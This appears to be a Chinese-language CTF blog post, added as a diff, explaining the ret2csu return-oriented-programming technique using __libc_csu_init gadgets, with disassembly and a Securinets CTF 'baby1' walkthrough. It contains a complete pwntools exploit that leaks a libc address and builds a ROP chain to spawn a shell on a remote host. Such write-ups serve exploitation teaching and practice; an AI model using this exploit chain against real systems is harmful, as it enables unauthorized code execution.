@@ -1,0 +1,350 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head><meta name="generator" content="Hexo 3.8.0">
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="description" content="0x01 ret2csuCTF Wiki  在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，">
+<meta name="keywords" content="二进制,栈溢出,Pwn">
+<meta property="og:type" content="article">
+<meta property="og:title" content="栈溢出之ret2csu">
+<meta property="og:url" content="https://Mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/index.html">
+<meta property="og:site_name" content="Mi1k7ea">
+<meta property="og:description" content="0x01 ret2csuCTF Wiki  在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/6.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/7.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/8.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/9.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/10.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/11.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/12.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/14.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/15.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/16.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/13.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/1.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/2.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/3.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/4.png">
+<meta property="og:image" content="https://mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/5.png">
+<meta property="og:updated_time" content="2019-04-14T14:44:19.047Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="栈溢出之ret2csu">
+<meta name="twitter:description" content="0x01 ret2csuCTF Wiki  在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，">
+<meta name="twitter:image" content="https://mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/6.png">
+    
+    
+        
+          
+              <link rel="shortcut icon" href="/images/favicon.ico">
+          
+        
+        
+          
+            <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
+          
+        
+        
+          
+            <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+          
+        
+    
+    <!-- title -->
+    <title>栈溢出之ret2csu</title>
+    <!-- styles -->
+    <link rel="stylesheet" href="/css/style.css">
+    <!-- persian styles -->
+    
+      <link rel="stylesheet" href="/css/rtl.css">
+    
+    <!-- rss -->
+    
+    
+</head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#"><i class="fas fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+         
+          <li><a href="/">H0m3</a></li>
+         
+          <li><a href="/categories/">C4teg0ri3s</a></li>
+         
+          <li><a href="/tags/">74gs</a></li>
+         
+          <li><a href="/about/">Ab0ut</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">01d-b10g</a></li>
+         
+          <li><a href="/atom.xml">R55</a></li>
+        
+      </ul>
+    </span>
+    <br>
+    <span id="actions">
+      <ul>
+        
+        
+        <li><a class="icon" href="/2019/04/09/蒸米ROP学习笔记/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/&text=栈溢出之ret2csu"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/&title=栈溢出之ret2csu"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/&is_video=false&description=栈溢出之ret2csu"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=栈溢出之ret2csu&body=Check out this article: https://Mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/&title=栈溢出之ret2csu"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://reddit.com/submit?url=https://Mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/&title=栈溢出之ret2csu"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.stumbleupon.com/submit?url=https://Mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/&title=栈溢出之ret2csu"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://digg.com/submit?url=https://Mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/&title=栈溢出之ret2csu"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.tumblr.com/share/link?url=https://Mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/&name=栈溢出之ret2csu&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    <div id="toc">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-ret2csu"><span class="toc-number">1.</span> <span class="toc-text">0x01 ret2csu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Securinets-CTF-baby1"><span class="toc-number">2.</span> <span class="toc-text">0x02 Securinets CTF baby1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-参考"><span class="toc-number">3.</span> <span class="toc-text">0x03 参考</span></a></li></ol>
+    </div>
+  </span>
+</div>
+
+    
+    <div class="content index py4">
+        
+        <article class="post" itemscope="" itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle" itemprop="name headline">
+        栈溢出之ret2csu
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+        <span itemprop="name">Mi1k7ea</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2019-04-12T13:30:11.000Z" itemprop="datePublished">2019-04-12</time>
+        
+      
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-archive"></i>
+        <a class="category-link" href="/categories/Pwn/">Pwn</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fas fa-tag"></i>
+        <a class="tag-link" href="/tags/Pwn/">Pwn</a>, <a class="tag-link" href="/tags/二进制/">二进制</a>, <a class="tag-link" href="/tags/栈溢出/">栈溢出</a>
+    </div>
+    <div class="article-tag">
+        <i class="fas fa-eye"></i>
+        阅读量：<span id="busuanzi_value_page_pv"></span>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content" itemprop="articleBody">
+    <h2 id="0x01-ret2csu"><a href="#0x01-ret2csu" class="headerlink" title="0x01 ret2csu"></a>0x01 ret2csu</h2><p><strong>CTF Wiki</strong></p>
+<blockquote>
+<p>在 64 位程序中，函数的前 6 个参数是通过寄存器传递的，但是大多数时候，我们很难找到每一个寄存器对应的 gadgets。 这时候，我们可以利用 x64 下的 __libc_csu_init 中的 gadgets。这个函数是用来对 libc 进行初始化操作的，而一般的程序都会调用 libc 函数，所以这个函数一定会存在。我们先来看一下这个函数 (当然，不同版本的这个函数有一定的区别)</p>
+</blockquote>
+<p>这里我们以本地编译的蒸米示例的level5为例，用objdump -d level5命令即可查看到以下内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">00000000004005c0 &lt;__libc_csu_init&gt;:</span><br><span class="line">  4005c0:	41 57                	push   %r15</span><br><span class="line">  4005c2:	41 56                	push   %r14</span><br><span class="line">  4005c4:	41 89 ff             	mov    %edi,%r15d</span><br><span class="line">  4005c7:	41 55                	push   %r13</span><br><span class="line">  4005c9:	41 54                	push   %r12</span><br><span class="line">  4005cb:	4c 8d 25 3e 08 20 00 	lea    0x20083e(%rip),%r12        # 600e10 &lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">  4005d2:	55                   	push   %rbp</span><br><span class="line">  4005d3:	48 8d 2d 3e 08 20 00 	lea    0x20083e(%rip),%rbp        # 600e18 &lt;__init_array_end&gt;</span><br><span class="line">  4005da:	53                   	push   %rbx</span><br><span class="line">  4005db:	49 89 f6             	mov    %rsi,%r14</span><br><span class="line">  4005de:	49 89 d5             	mov    %rdx,%r13</span><br><span class="line">  4005e1:	4c 29 e5             	sub    %r12,%rbp</span><br><span class="line">  4005e4:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  4005e8:	48 c1 fd 03          	sar    $0x3,%rbp</span><br><span class="line">  4005ec:	e8 0f fe ff ff       	callq  400400 &lt;_init&gt;</span><br><span class="line">  4005f1:	48 85 ed             	test   %rbp,%rbp</span><br><span class="line">  4005f4:	74 20                	je     400616 &lt;__libc_csu_init+0x56&gt;</span><br><span class="line">  4005f6:	31 db                	xor    %ebx,%ebx</span><br><span class="line">  4005f8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)</span><br><span class="line">  4005ff:	00 </span><br><span class="line">  400600:	4c 89 ea             	mov    %r13,%rdx</span><br><span class="line">  400603:	4c 89 f6             	mov    %r14,%rsi</span><br><span class="line">  400606:	44 89 ff             	mov    %r15d,%edi</span><br><span class="line">  400609:	41 ff 14 dc          	callq  *(%r12,%rbx,8)</span><br><span class="line">  40060d:	48 83 c3 01          	add    $0x1,%rbx</span><br><span class="line">  400611:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  400614:	75 ea                	jne    400600 &lt;__libc_csu_init+0x40&gt;</span><br><span class="line">  400616:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  40061a:	5b                   	pop    %rbx</span><br><span class="line">  40061b:	5d                   	pop    %rbp</span><br><span class="line">  40061c:	41 5c                	pop    %r12</span><br><span class="line">  40061e:	41 5d                	pop    %r13</span><br><span class="line">  400620:	41 5e                	pop    %r14</span><br><span class="line">  400622:	41 5f                	pop    %r15</span><br><span class="line">  400624:	c3                   	retq   </span><br><span class="line">  400625:	90                   	nop</span><br><span class="line">  400626:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">  40062d:	00 00 00</span><br></pre></td></tr></table></figure>
+<p>这里我们可以利用以下几点：</p>
+<ul>
+<li>从 0x000000000040061A 一直到结尾，我们可以利用栈溢出构造栈上数据来控制rbx、rbp、r12、r13、r14、r15 寄存器的数据；</li>
+<li>从 0x0000000000400600 到 0x0000000000400609，我们可以将r13赋给rdx，将r14赋给rsi，将r15d赋给 edi（需要注意的是，虽然这里赋给的是 edi，<strong>但其实此时 rdi 的高 32 位寄存器值为 0（自行调试）</strong>，所以其实我们可以控制rdi寄存器的值，只不过只能控制低32位），而这三个寄存器，也是 x64 函数调用中传递的前三个寄存器。此外，如果我们可以合理地控制r12与rbx，那么我们就可以调用我们想要调用的函数。比如说我们可以控制rbx为0，r12为存储我们想要调用的函数的地址。</li>
+<li>从0x000000000040060D到0x0000000000400614，我们可以控制rbx与rbp的之间的关系为rbx + 1 = rbp，这样我们就不会执行loc_400600，进而可以继续执行下面的汇编程序。这里我们可以简单的设置rbx=0，rbp=1。</li>
+</ul>
+<p><strong>BlackHat 2018</strong></p>
+<p>该项技术在BlackHat 2018中介绍过，下面用其PPT来说下。</p>
+<p>先编写一个代码量很小的C代码，编译该C文件之后会看到存在大量代码，除去源代码部分，剩下的代码都成为Attached Code即附属代码：</p>
+<p><img src="/2019/04/12/中级ROP之ret2csu/6.png" alt=""></p>
+<p><img src="/2019/04/12/中级ROP之ret2csu/7.png" alt=""></p>
+<p>这些Attached Code的攻击是多有效呢？</p>
+<p><img src="/2019/04/12/中级ROP之ret2csu/8.png" alt=""></p>
+<p>下面看下这两段可以利用的Gadgets，具体的描述前面已讲解，这里的图片更具体地表现出来了：</p>
+<p><img src="/2019/04/12/中级ROP之ret2csu/9.png" alt=""></p>
+<p><img src="/2019/04/12/中级ROP之ret2csu/10.png" alt=""></p>
+<p>将两段Gadgets连接起来构造出ROP链，从而可以实现调用任意含有3个参数的函数：</p>
+<p><img src="/2019/04/12/中级ROP之ret2csu/11.png" alt=""></p>
+<p><img src="/2019/04/12/中级ROP之ret2csu/12.png" alt=""></p>
+<p>利用write()函数泄露libc地址：</p>
+<p><img src="/2019/04/12/中级ROP之ret2csu/14.png" alt=""></p>
+<p><img src="/2019/04/12/中级ROP之ret2csu/15.png" alt=""></p>
+<p>最终构造的ROP链：</p>
+<p><img src="/2019/04/12/中级ROP之ret2csu/16.png" alt=""></p>
+<p>什么时候适合应用ret2csu呢？</p>
+<p><img src="/2019/04/12/中级ROP之ret2csu/13.png" alt=""></p>
+<h2 id="0x02-Securinets-CTF-baby1"><a href="#0x02-Securinets-CTF-baby1" class="headerlink" title="0x02 Securinets CTF baby1"></a>0x02 Securinets CTF baby1</h2><p>这里以Securinets CTF的一道Pwn题baby1为例。</p>
+<p>程序先输出一段内容，然后让你输入东西后即退出；是个动态链接文件，会加载libc；安全编译选项只开启了NX：</p>
+<p><img src="/2019/04/12/中级ROP之ret2csu/1.png" alt=""></p>
+<p>IDA分析下，存在明显的栈溢出漏洞，但在程序中找不到system()函数和”/bin/sh”字符串，但是可看到其是存在read()、write()和__libc_csu_init()函数的，由此可以联想到可以利用ret2csu技术来实现攻击：</p>
+<p><img src="/2019/04/12/中级ROP之ret2csu/2.png" alt=""></p>
+<p>通过objdump -d baby1命令查看__libc_csu_init()函数的gadgets：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">0000000000400660 &lt;__libc_csu_init&gt;:</span><br><span class="line">  400660:	41 57                	push   %r15</span><br><span class="line">  400662:	41 56                	push   %r14</span><br><span class="line">  400664:	41 89 ff             	mov    %edi,%r15d</span><br><span class="line">  400667:	41 55                	push   %r13</span><br><span class="line">  400669:	41 54                	push   %r12</span><br><span class="line">  40066b:	4c 8d 25 9e 07 20 00 	lea    0x20079e(%rip),%r12        # 600e10 &lt;__frame_dummy_init_array_entry&gt;</span><br><span class="line">  400672:	55                   	push   %rbp</span><br><span class="line">  400673:	48 8d 2d 9e 07 20 00 	lea    0x20079e(%rip),%rbp        # 600e18 &lt;__init_array_end&gt;</span><br><span class="line">  40067a:	53                   	push   %rbx</span><br><span class="line">  40067b:	49 89 f6             	mov    %rsi,%r14</span><br><span class="line">  40067e:	49 89 d5             	mov    %rdx,%r13</span><br><span class="line">  400681:	4c 29 e5             	sub    %r12,%rbp</span><br><span class="line">  400684:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">  400688:	48 c1 fd 03          	sar    $0x3,%rbp</span><br><span class="line">  40068c:	e8 e7 fd ff ff       	callq  400478 &lt;_init&gt;</span><br><span class="line">  400691:	48 85 ed             	test   %rbp,%rbp</span><br><span class="line">  400694:	74 20                	je     4006b6 &lt;__libc_csu_init+0x56&gt;</span><br><span class="line">  400696:	31 db                	xor    %ebx,%ebx</span><br><span class="line">  400698:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)</span><br><span class="line">  40069f:	00 </span><br><span class="line">  4006a0:	4c 89 ea             	mov    %r13,%rdx</span><br><span class="line">  4006a3:	4c 89 f6             	mov    %r14,%rsi</span><br><span class="line">  4006a6:	44 89 ff             	mov    %r15d,%edi</span><br><span class="line">  4006a9:	41 ff 14 dc          	callq  *(%r12,%rbx,8)</span><br><span class="line">  4006ad:	48 83 c3 01          	add    $0x1,%rbx</span><br><span class="line">  4006b1:	48 39 eb             	cmp    %rbp,%rbx</span><br><span class="line">  4006b4:	75 ea                	jne    4006a0 &lt;__libc_csu_init+0x40&gt;</span><br><span class="line">  4006b6:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">  4006ba:	5b                   	pop    %rbx</span><br><span class="line">  4006bb:	5d                   	pop    %rbp</span><br><span class="line">  4006bc:	41 5c                	pop    %r12</span><br><span class="line">  4006be:	41 5d                	pop    %r13</span><br><span class="line">  4006c0:	41 5e                	pop    %r14</span><br><span class="line">  4006c2:	41 5f                	pop    %r15</span><br><span class="line">  4006c4:	c3                   	retq   </span><br><span class="line">  4006c5:	90                   	nop</span><br><span class="line">  4006c6:	66 2e 0f 1f 84 00 00 	nopw   %cs:0x0(%rax,%rax,1)</span><br><span class="line">  4006cd:	00 00 00</span><br></pre></td></tr></table></figure>
+<p>可以确定gadget1的地址为0x4006ba，gadget2的地址为0x4006a0。</p>
+<p>GDB调试，使用pattern计算溢出字节为56：</p>
+<p><img src="/2019/04/12/中级ROP之ret2csu/3.png" alt=""></p>
+<p>这里我参考另一篇博文《蒸米32位及64位ROP笔记》中level5的第二种做法，我们再找一个pop rdi;ret的gadget：</p>
+<p><img src="/2019/04/12/中级ROP之ret2csu/4.png" alt=""></p>
+<p>找到该gadget地址为0x4006c3。</p>
+<p>仿照level5写payload就好（具体的解释可以看《蒸米32位及64位ROP笔记》）：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"192.168.17.157"</span>, <span class="number">10001</span>)</span><br><span class="line">p.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./baby1"</span>)</span><br><span class="line"></span><br><span class="line">gadget1 = <span class="number">0x4006ba</span></span><br><span class="line">gadget2 = <span class="number">0x4006a0</span></span><br><span class="line">pop_rdi_ret_addr = <span class="number">0x00000000004006c3</span></span><br><span class="line"></span><br><span class="line">main_addr = elf.symbols[<span class="string">"main"</span>]</span><br><span class="line">write_got = elf.got[<span class="string">"write"</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]main() addr: "</span> + hex(main_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]write() got: "</span> + hex(write_got)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span><span class="params">(rbx, rbp, r12, r13, r14, r15, ret)</span>:</span></span><br><span class="line">        payload = <span class="string">"A"</span> * <span class="number">56</span></span><br><span class="line">        payload += p64(gadget1) + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)</span><br><span class="line">        payload += p64(gadget2)</span><br><span class="line">        payload += <span class="string">"B"</span> * <span class="number">56</span></span><br><span class="line">        payload += p64(ret)</span><br><span class="line">        <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending payload to leak write() addr..."</span></span><br><span class="line">payload = csu(<span class="number">0</span>, <span class="number">1</span>, write_got, <span class="number">8</span>, write_got, <span class="number">1</span>, main_addr)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">write_addr = u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]leak write() addr: "</span> + hex(write_got)</span><br><span class="line"></span><br><span class="line">p.recv(<span class="number">1024</span>)</span><br><span class="line"></span><br><span class="line">libc = LibcSearcher(<span class="string">"write"</span>, write_addr)</span><br><span class="line">libc_base = write_addr - libc.dump(<span class="string">"write"</span>)</span><br><span class="line">system_addr = libc_base + libc.dump(<span class="string">"system"</span>)</span><br><span class="line">binsh_addr = libc_base + libc.dump(<span class="string">"str_bin_sh"</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]libc base: "</span> + hex(libc_base)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]system() addr: "</span> + hex(system_addr)</span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]/bin/sh addr: "</span> + hex(binsh_addr)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"[*]sending exp..."</span></span><br><span class="line">exp = <span class="string">"A"</span> * <span class="number">56</span></span><br><span class="line">exp += p64(pop_rdi_ret_addr)</span><br><span class="line">exp += p64(binsh_addr)</span><br><span class="line">exp += p64(system_addr)</span><br><span class="line">p.sendline(exp)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+<p>这里打远程的机子：</p>
+<p><img src="/2019/04/12/中级ROP之ret2csu/5.png" alt=""></p>
+<h2 id="0x03-参考"><a href="#0x03-参考" class="headerlink" title="0x03 参考"></a>0x03 参考</h2><p><a href="https://ctf-wiki.github.io/ctf-wiki/pwn/linux/stackoverflow/medium-rop/#ret2csu" target="_blank" rel="noopener">ret2csu</a></p>
+<p><a href="http://eternalsakura13.com/2018/03/31/return2csu/" target="_blank" rel="noopener">return2csu学习笔记</a></p>
+
+  </div>
+</article>
+
+
+<script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script>
+<script src="//unpkg.com/valine/dist/Valine.min.js"></script>
+<br><br>
+<div id="vcomments"></div>
+    <script>
+        new Valine({
+            av: AV,
+            el: '#vcomments',
+            appId: 'Jyl0XQwm2jIH31Tx16dygCNv-gzGzoHsz',
+            appKey: 'Iqq1VTg9X5EfKJt3MMIj8MMB',
+            placeholder: '大佬亲临寒站，可否指点一二',
+        })
+    </script>
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+         
+          <li><a href="/">H0m3</a></li>
+         
+          <li><a href="/categories/">C4teg0ri3s</a></li>
+         
+          <li><a href="/tags/">74gs</a></li>
+         
+          <li><a href="/about/">Ab0ut</a></li>
+         
+          <li><a href="https://blog.csdn.net/ski_12/">01d-b10g</a></li>
+         
+          <li><a href="/atom.xml">R55</a></li>
+        
+      </ul>
+    </div>
+
+    <div id="toc-footer" style="display: none">
+      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-ret2csu"><span class="toc-number">1.</span> <span class="toc-text">0x01 ret2csu</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-Securinets-CTF-baby1"><span class="toc-number">2.</span> <span class="toc-text">0x02 Securinets CTF baby1</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-参考"><span class="toc-number">3.</span> <span class="toc-text">0x03 参考</span></a></li></ol>
+    </div>
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" href="http://www.facebook.com/sharer.php?u=https://Mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://twitter.com/share?url=https://Mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/&text=栈溢出之ret2csu"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="http://www.linkedin.com/shareArticle?url=https://Mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/&title=栈溢出之ret2csu"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://pinterest.com/pin/create/bookmarklet/?url=https://Mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/&is_video=false&description=栈溢出之ret2csu"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=栈溢出之ret2csu&body=Check out this article: https://Mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/"><i class="fas fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="https://getpocket.com/save?url=https://Mi1k7ea.github.com/2019/04/12/中级ROP之ret2csu/&title=栈溢出之ret2csu"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
